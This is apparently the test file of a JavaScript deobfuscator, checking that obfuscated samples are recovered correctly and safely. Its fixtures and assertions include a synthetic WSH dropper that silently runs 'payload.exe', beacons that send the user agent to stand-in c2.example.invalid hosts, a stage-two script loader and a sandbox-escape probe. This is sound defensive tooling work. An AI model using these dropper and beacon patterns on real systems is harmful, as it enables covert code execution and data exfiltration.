import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import { deobfuscate } from '../src/index.js';
import { generate } from '../src/codegen.js';
import { parse } from '../src/ast.js';

const norm = (code) => generate(parse(code).ast);
// most tests exercise the full pipeline; static-only behaviour is tested explicitly below
const deob = (code, opts) => deobfuscate(code, { dynamic: true, ...opts }).code;
const same = (input, expected, opts) => assert.equal(deob(input, opts), norm(expected));
const unchanged = (input, opts) => same(input, input, opts);

// ---------- static transforms ----------

test('constant folding', () => {
  same("x(!![], ![], 0x10 + 1, 'a' + 'b', void 0, typeof 'q', -(-1), `t${1 + 1}`);",
    "x(true, false, 17, 'ab', undefined, 'string', 1, 't2');");
});

test('computed members and keys', () => {
  same("a['b']['c'](); o = {'k': 1, ['m']: 2};", 'a.b.c(); o = {k: 1, m: 2};');
  unchanged("o = {['__proto__']: 1}; a['not-ident'];");
});

test('dead branches keep hoisted vars', () => {
  same('if (1 === 1) { a(); } else { b(); }', 'a();');
  same("if ('x' === 'y') { var v = 1; } v = 2; use(v);", 'use(2);');
  same("if ('x' === 'y') { var v = 1; } if (c) { v = 2; } use(v);", 'var v; if (c) { v = 2; } use(v);');
  same('x = true ? a : b; y = false || c; z = 0 && d;', 'x = a; y = c; z = 0;');
});

test('sequence splitting', () => {
  same('function f() { return a(), b(), c; }', 'function f() { a(); b(); return c; }', { removeDeadCode: false });
  same('a(), b();', 'a(); b();');
});

test('constant inlining respects reassignment, hoisting and shadowing', () => {
  same("var s = 'x'; f(s);", "f('x');");
  unchanged("var s = 'x'; if (c) { s = g(); } f(s);");
  same("var s = 'x'; s = g(); f(s);", 'var s_1 = g(); f(s_1);'); // straight-line reassignment: new binding
  unchanged("f(s); var s = 'x';", { removeDeadCode: false });
  same("var s = 'x'; function g(s) { return s; } h(g, s);", "function g(s) { return s; } h(g, 'x');");
});

test('member access on constant arrays', () => {
  same("var a = ['log', 'hi']; console[a[0]](a[1]);", "console.log('hi');");
  same("x = 'abc'.length + ['p','q'][1];", "x = '3q';");
  unchanged("var a = ['x']; a.push('y'); f(a[0]);"); // mutated: keep
});

test('proxy variables are only inlined when the target resolves identically', () => {
  same('var b = a; b(1);', 'a(1);');
  unchanged('var b = a; function f(a) { return b(a); } g(f);');
});

test('proxy functions', () => {
  same('function w(x, y) { return dec(y - 1, x); } w(k, 5);', 'dec(4, k);');
  // evaluation order of two side-effecting args would change
  unchanged('function f(a, b) { return b + a; } g(f(x(), y()));');
  // recursion is never inlined
  unchanged('function r(n) { return r(n - 1); } g(r(3));');
});

test('proxy objects', () => {
  same("var o = {'aB': function (a, b) { return a + b; }, 'cD': 'log'}; console[o['cD']](o['aB'](q, 1));",
    'console.log(q + 1);');
  unchanged("var o = {aB: 'x'}; o.aB = 'y'; f(o.aB);"); // written: keep
});

test('control flow unflattening', () => {
  same("var o = '2|0|1'.split('|'), i = 0; while (!![]) { switch (o[i++]) { case '0': b(); continue; case '1': return c(); case '2': a(); continue; } break; }",
    'a(); b(); return c();');
  // a loose `break` inside a case would change meaning: leave it alone
  const loose = "var o = ['1','0'], i = 0; while (true) { switch (o[i++]) { case '0': if (x) break; b(); continue; case '1': a(); continue; } break; }";
  assert.match(deob(loose), /switch/);
});

test('eval and Function shells', () => {
  same("eval('a(1); b(2);');", 'a(1); b(2);');
  same("x = eval('1 + y');", 'x = 1 + y;');
  same("Function('g(1)')();", '(function () { g(1); })();');
  // the body would capture the local `g` if inlined
  const local = "function f(g) { Function('g(1)')(); } h(f);";
  assert.match(deob(local), /Function\(/);
});

// ---------- sandboxed transforms ----------

test('builtin calls on literals', () => {
  same("x = 'dlrow'.split('').reverse().join('') + String.fromCharCode(33) + atob('aGk=') + parseInt('0x1f');",
    "x = 'world!hi31';");
  unchanged("x = 'aaa'.replace(/a+/g, 'b');", { dynamic: false }); // regex: sandbox only
});

test('decoder calls: deterministic, side-effect free only', () => {
  same("function d(i) { return ['a', 'b', 'c'][i - 10]; } x = d(11) + d(12);", "x = 'bc';");
  // writes global state -> not a decoder
  const se = 'var n = 0; function f(k) { n++; return k; } x = f(1); report(n);';
  assert.match(deob(se), /f\(1\)/);
  // non-deterministic
  assert.match(deob('function r(k) { var t = Math.random(); return t * k; } x = r(1);'), /r\(1\)/);
  // safe mode never evaluates
  assert.match(deob("function d(i) { var t = ['a']; return t[i]; } x = d(0);", { dynamic: false }), /d\(0\)/);
});

test('sandbox has no host access', () => {
  const code = "function p(k) { var P = this.constructor.constructor('return process')(); return typeof P + k; } x = p(1);" +
    "function q(k) { var t = typeof require + typeof process; return t + k; } y = q('!');";
  const out = deob(code);
  assert.match(out, /x = p\(1\)/); // ReferenceError inside the sandbox -> left alone
  assert.match(out, /y = 'undefinedundefined!'/);
});

// ---------- end to end ----------

function behaviour(code) {
  const log = [];
  const ctx = {
    navigator: { userAgent: 'UA', language: 'fr' },
    localStorage: { getItem: (k) => (log.push(['getItem', k]), null), setItem: (k, v) => log.push(['setItem', k, typeof v]) },
    JSON, Math, decodeURIComponent, parseInt, String,
    console: { log: (...a) => log.push(['log', ...a]) },
    fetch: (u, o) => {
      log.push(['fetch', u, o.method, o.body.replace(/"id":"[^"]+"/, '"id":X')]);
      return { then(f) { f({ status: 200 }); return { catch() {} }; } };
    },
  };
  vm.createContext(ctx);
  vm.runInContext(code, ctx);
  return log;
}

test('obfuscator.io-style sample: fully recovered, same behaviour', () => {
  const src = fs.readFileSync(new URL('../samples/obfuscated.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.deepEqual(behaviour(out), behaviour(src));
  assert.doesNotMatch(out, /_0x4f1e|_0x3b2a|_0x2a91|_0x19c7|switch/);
  assert.match(out, /fetch\('https:\/\/c2\.example\.invalid\/beacon'/);
  assert.match(out, /localStorage\.setItem\('uid'/);
});

test('Dean Edwards packer: eval(function(p,a,c,k,e,d){...}) is unpacked', () => {
  const src = fs.readFileSync(new URL('../samples/packed.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.doesNotMatch(out, /eval|function \(p, a, c, k/);
  assert.match(out, /document\.write\('<script src="https:\/\/cdn\.example\.invalid\/stage2\.js"><\/script>'\)/);
  assert.match(out, /beacon\.src = 'https:\/\/c2\.example\.invalid\/p\?u=' \+ encodeURIComponent\(navigator\.userAgent\)/);
});

test('WSH junk-char dropper pattern (synthetic)', () => {
  const src = `
    var s = "♉W♉S♉c♉r♉i♉p♉t♉.♉S♉h♉e♉l♉l"; var n = s.split("♉").join(""); var sh = new ActiveXObject(n);
    var d = sh.SpecialFolders("MyDocuments");
    var J = 'x'; function cIXf(a) { J += 'noise'; } var J = 'y'; function cIXf(b) { J += 'more'; }
    var g = {}; var k = 'K'; g[k] = { a: ['junk'] };
    function rev(t) { var a = t.split(""); var b = a.reverse(); return b.join(""); }
    var p = d + "\\\\" + rev("♉♉♉exe.daolyap♉♉♉");
    var q = 'aGVs?bG8!'; var q1 = q.split('?').join(''); var q2 = q1.split('!').join(''); el.text = q2;
    var q = 'd29y?bGQ='; var q1 = q.split('?').join(''); var q2 = q1.split('!').join(''); el2.text = q2;
    sh.Run(p.split("♉♉♉").join(""), 0, false);`;
  same(src, `
    var sh = new ActiveXObject('WScript.Shell');
    var d = sh.SpecialFolders('MyDocuments');
    var p = d + '\\\\payload.exe';
    el.text = 'aGVsbG8';
    el2.text = 'd29ybGQ=';
    sh.Run(p, 0, false);`);
});

test('redeclarations are only split when straight-line', () => {
  same("function f() { var s = 'a'; use(s); var s = 'b'; use(s); } g(f);", "function f() { use('a'); use('b'); } g(f);");
  unchanged("function f() { var s = 'a'; g(function () { return s; }); var s = 'b'; use(s); } h(f);");
});

test('dead code: re-declared junk and its writes are removed together', () => {
  same("var J = 'x'; function n(a) { J += 'a'; } var J = 'y'; function n(b) { J += 'b'; } go();", 'go();');
  same("var J = 'x'; J += 'a'; use(J);", "use('xa');"); // a live accumulator folds (0.5.0)
});

test('input decoding: UTF-16 (BOM / no BOM), UTF-8 BOM, ANSI, JScript.Encode', async () => {
  const { decodeSource } = await import('../src/input.js');
  const s = "var x = 'héllo € ♉';";
  const le = Buffer.from(s, 'utf16le');
  const be = Buffer.from(le); be.swap16();
  assert.equal(decodeSource(Buffer.concat([Buffer.from([0xff, 0xfe]), le])).code, s);
  assert.equal(decodeSource(Buffer.concat([Buffer.from([0xfe, 0xff]), be])).code, s);
  assert.equal(decodeSource(le).code, s);
  assert.equal(decodeSource(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(s)])).code, s);
  assert.equal(decodeSource(Buffer.from([0x76, 0x3d, 0x27, 0xe9, 0x80, 0x27])).code, "v='é€'");
  assert.throws(() => decodeSource(Buffer.from('#@~^MwAAAA==abc^#~@')), /JScript\.Encode/);
});

function wshTrace(code) {
  const log = [];
  const obj = (name) => {
    switch (name) {
      case 'WScript.Shell': return { ExpandEnvironmentStrings: (s) => s.replace('%TEMP%', 'C:\\Temp') };
      case 'Scripting.FileSystemObject': return { GetTempName: () => 'radB1234.tmp',
        CreateTextFile: (p) => ({ Write: (d) => log.push(['write', p, d]), Close() {} }) };
      case 'WbemScripting.SWbemLocator': return { ConnectServer: () => ({
        Get: (cls) => cls === 'Win32_Process'
          ? { Methods_: { Item: () => ({ InParameters: { SpawnInstance_: () => ({}) } }) },
            ExecMethod_: (m, p) => log.push(['exec', m, p.CommandLine, p.ProcessStartupInformation.ShowWindow]) }
          : { SpawnInstance_: () => ({}) } }) };
      default: throw new Error('unexpected ActiveX ' + name);
    }
  };
  const ctx = { ActiveXObject: function (n) { return obj(n); }, WScript: { Echo() {}, Quit() { throw { quit: true }; } }, Date, Math, String, parseInt };
  vm.createContext(ctx);
  try { vm.runInContext(code, ctx); } catch (e) { if (!e || !e.quit) throw e; }
  return log;
}

test('WSH -> PowerShell dropper (synthetic): junk globals, reassigned blob, decode loop, WMI launch', () => {
  const src = fs.readFileSync(new URL('../samples/wsh-ps1.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.deepEqual(wshTrace(out), wshTrace(src));
  // line endings normalised: git (or `git am`) may rewrite CRLF in the expectation file
  const expected = fs.readFileSync(new URL('../samples/wsh-ps1.expected.ps1', import.meta.url), 'utf8').replace(/\r\n/g, '\n');
  const written = wshTrace(out).find((e) => e[0] === 'write')[2].replace(/\r\n/g, '\n');
  assert.equal(written, expected, 'decoded PowerShell matches');
  assert.match(out, /f\.Write\('Write-Output/, 'decoded PowerShell is a literal in the output');
  assert.doesNotMatch(out, /this\.|for \(|split\(|neverDefined|decoy/);
  assert.ok(out.split('\n').length < 40);
});

test('constant loops: only self-contained, deterministic loops are evaluated', () => {
  same("function f() { var o = ''; for (var i = 0; i < 3; i++) { o += String.fromCharCode(97 + i); } return o; } g(f);",
    "function f() { return 'abc'; } g(f);");
  // calls user code
  assert.match(deob('function f() { var o = 0; for (var i = 0; i < 3; i++) { o += h(i); } return o; } g(f);'), /for \(/);
  // reads a non-constant
  assert.match(deob('function f(n) { var o = 0; for (var i = 0; i < n; i++) { o += i; } return o; } g(f);'), /for \(/);
  // non-deterministic
  assert.match(deob('function f() { var o = 0; for (var i = 0; i < 3; i++) { o += Math.random(); } return o; } g(f);'), /for \(/);
  // loop variable used afterwards
  assert.match(deob("function f() { var o = ''; for (var i = 0; i < 3; i++) { o += 'x'; } return o + i; } g(f);"), /for \(/);
  // safe mode never evaluates
  assert.match(deob("function f() { var o = ''; for (var i = 0; i < 3; i++) { o += 'x'; } return o; } g(f);", { dynamic: false }), /for \(/);
});

test('global this.X junk: removed only when never read', () => {
  same("this.a = 'x'; this.b = a === 'x'; this.o = {k: 1}; o.k++; var t = new Date().getTime(); var u = t > 0; go();", 'go();');
  unchanged("this.a = 'x'; use(a);");
  unchanged("this.a = 'x'; use(this.a);");
  unchanged("this.a = 'x'; this.a = g(); go();");
  unchanged("this.a = 'x'; var k = h(); use(this[k]);"); // computed global access: keep everything
});

test('unreachable code after return / WScript.Quit()', () => {
  same('function f() { a(); return 1; b(); } h(f);', 'function f() { a(); return 1; } h(f);');
  same('function f() { WScript.Quit(); if (z) { d(); } } h(f);', 'function f() { WScript.Quit(); } h(f);');
  unchanged('function f(WScript) { WScript.Quit(); more(); } h(f);');
});

test('static by default: nothing runs without dynamic, pending work is reported', () => {
  const src = fs.readFileSync(new URL('../samples/obfuscated.js', import.meta.url), 'utf8');
  const r = deobfuscate(src);
  assert.equal(r.dynamic, false);
  assert.match(r.code, /_0x4f1e\(/); // decoder calls untouched
  assert.ok(r.pending.resolveDecoderCalls > 0);
  const d = deobfuscate(src, { dynamic: true });
  assert.deepEqual(d.pending, {});
  assert.doesNotMatch(d.code, /_0x4f1e/);
  // pre-0.4 option name still works
  assert.doesNotMatch(deobfuscate(src, { unsafe: true }).code, /_0x4f1e/);
});

test('static builtin folding: literal string ops only, never regex, never mutating a shared array', () => {
  const st = (c) => deobfuscate(c).code;
  assert.equal(st("x = 'dlrow'.split('').reverse().join('') + String.fromCharCode(33) + atob('aGk=');"), norm("x = 'world!hi';"));
  assert.equal(st("var b = 'a#b'; use(b.split('#').join(''));"), norm("use('ab');"));
  assert.match(st("x = 'aaa'.replace(/a+/g, 'b');"), /replace\(\/a\+\/g/);
  assert.match(st("x = 'x'.repeat(1e9);"), /repeat/);
  assert.match(st("x = 'abc'.replace('b', function () { return evil(); });"), /evil/);
  for (const dynamic of [false, true]) {
    const out = deobfuscate('var a = [3,1,2]; x = a.reverse().join(); y = a.join(); r(x, y);', { dynamic }).code;
    assert.match(out, /y = a\.join\(\)/, `mutated array must not be folded (dynamic=${dynamic})`);
  }
});

test('self-feeding junk variable: removed when only it reads itself, kept when really used', () => {
  const K = '"k"';
  const junk = [
    `if (/k/.test(p || "")) { p += ${K}; } else { p = ${K}; }`,
    `try { p = p.concat(${K}); } catch (e) { p = ${K}; }`,
    `switch (typeof p) { case "string": p += ${K}; break; default: p = ${K}; }`,
    `p = (function (q) { return (q || "") + ${K}; })(p);`,
    `p = (p && p.indexOf(${K}) !== -1) ? p + ${K} : ${K};`,
    `var p = ${K}; p = String(p || "").concat(p);`,
    `var p = [p || "", ${K}]; p = p.join("");`,
    `for (var p = 0; p < 1; p++) { p = (p || "") + ${K}; }`,
  ].join('\n');
  const wrap = (tail) => `function f() {\n${junk}\n${tail}\n}\nf();`;
  assert.equal(deobfuscate(wrap('run("x");')).code, norm('function f() { run("x"); } f();'));
  assert.match(deobfuscate(wrap('run(p);')).code, /concat/);
  // a write to anything else, or a call with effects, keeps the statement
  assert.match(deobfuscate(wrap('if (p) { other = 1; } run("x");')).code, /other = 1/);
  assert.match(deobfuscate(wrap('p = p + log(); run("x");')).code, /log\(\)/);
});

test('static: += accumulators, join loops over constant string arrays, plain-literal regexes', () => {
  const st = (c) => deobfuscate(c).code;
  assert.equal(st("var c = ''; c += 'a'; c += 'b'; use(c);"), norm("use('ab');"));
  assert.equal(st("var a = ['', 'w', 'in']; var s = ''; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s);"), norm("use('win');"));
  assert.equal(st(`try {
    var c = ''; c += 'aXXb'; c += 'cXXd';
    var p = c.split('XX'); var o = '';
    for (var i = 0; i < p.length; i++) { o += p[i]; }
    run(('xXX' + o.replace(/'/g, "''") + 'XXy').split('XX').join(''));
  } catch (e) {}`), norm("try { run('xabcdy'); } catch (e) {}"));
  // not provably strings / counter used later / array changed / real regexes: left alone
  assert.match(st('var a = [1, , 3]; var s = ""; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s);'), /for \(/);
  assert.match(st('var a = ["x"]; var s = ""; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s, i);'), /for \(/);
  assert.match(st('var a = ["x"]; a[0] = f(); var s = ""; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s);'), /for \(/);
  assert.match(st("x = 'a.b'.split(/./);"), /split\(\/\.\//);
  assert.equal(st("var s = 'a'; s += s; use(s);"), norm("use('aa');"));
});

test('literal append runs merge before SSA; huge and deep chains stay fast and never crash', () => {
  const st = (c) => deobfuscate(c);
  assert.equal(st("var s = ''; s += 'ab'; var k = 1; s += 'cd'; use(s, k);").code, norm("use('abcd', 1);"));
  // a read between appends splits the run
  assert.equal(st("var s = 'a'; s += 'b'; log(s); s += 'c'; use(s);").code, norm("log('ab'); use('abc');"));
  // a call in between that could read s through a nested function: left as the SSA pass decides
  assert.match(st("var s = 'a'; function g() { return s; } s += 'b'; use(g(), s);").code, /s \+= 'b'|s = 'ab'|'ab'/);
  let lit = "var s = '';\n"; for (let i = 0; i < 20000; i++) lit += `s += 'x${i % 10}';\n`;
  const r1 = st(lit + 'use(s);');
  assert.deepEqual(r1.problems, []);
  assert.match(r1.code, /^use\('x0x1x2/);
  let dyn = "var s = '';\n"; for (let i = 0; i < 5000; i++) dyn += `s += f(${i % 7});\n`;
  const t0 = Date.now();
  const r2 = st(dyn + 'use(s);');
  assert.deepEqual(r2.problems, []);
  assert.ok(Date.now() - t0 < 20000);
});
